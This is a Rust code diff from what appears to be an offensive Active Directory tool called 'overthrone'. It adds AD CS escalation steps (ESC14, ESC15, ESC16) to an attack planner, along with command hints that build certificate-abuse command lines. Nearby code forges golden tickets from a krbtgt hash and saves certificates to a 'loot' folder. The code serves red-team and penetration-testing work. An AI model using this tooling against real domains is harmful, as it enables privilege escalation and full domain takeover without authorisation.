@@ -364,6 +364,43 @@ pub async fn execute_step(
             )
             .await
         }
+        PlannedAction::AdcsEsc14 => exec_adcs_guided(ctx, state, "ESC14", &[]).await,
+        PlannedAction::AdcsEsc15 {
+            template,
+            ca,
+            target_upn,
+        } => {
+            exec_adcs_guided(
+                ctx,
+                state,
+                "ESC15",
+                &[
+                    ("template", template.as_str()),
+                    ("ca", ca.as_str()),
+                    ("target_upn", target_upn.as_str()),
+                ],
+            )
+            .await
+        }
+        PlannedAction::AdcsEsc16 {
+            template,
+            ca,
+            victim,
+            target_upn,
+        } => {
+            exec_adcs_guided(
+                ctx,
+                state,
+                "ESC16",
+                &[
+                    ("template", template.as_str()),
+                    ("ca", ca.as_str()),
+                    ("victim", victim.as_str()),
+                    ("target_upn", target_upn.as_str()),
+                ],
+            )
+            .await
+        }
         PlannedAction::ForgeGoldenTicket { krbtgt_hash } => {
             exec_golden_ticket(ctx, state, krbtgt_hash).await
         }
@@ -2686,6 +2723,7 @@ fn adcs_command_hint(
     let victim = param(params, "victim", "<victim>");
     let variant = param(params, "variant", "a");
     match technique {
+        "ESC14" => "ovt adcs esc14".to_string(),
         "ESC2" => format!(
             "overthrone adcs esc2 --ca {ca} --template {template} --output loot/esc2_{target_upn}.pfx"
         ),
@@ -2714,6 +2752,14 @@ fn adcs_command_hint(
         ),
         "ESC13" => format!(
             "overthrone adcs esc13 --ca {ca} --template {template} --policy-oid <linked-policy-oid> --linked-group-dn <linked-group-dn> --subject {target_upn}"
+        ),
+        "ESC15" => format!(
+            "overthrone adcs esc15 --ca {ca} --template {template} --target-user {}",
+            target_upn.split('@').next().unwrap_or(target_upn)
+        ),
+        "ESC16" => format!(
+            "overthrone adcs esc16 --ca {ca} --template {template} --target-upn {target_upn} --victim {victim} --original-upn <victim-original-upn> --ldap-url ldap://{dc}",
+            dc = ctx.dc_ip
         ),
         _ => format!(
             "overthrone adcs {} --ca {ca} --template {template}",
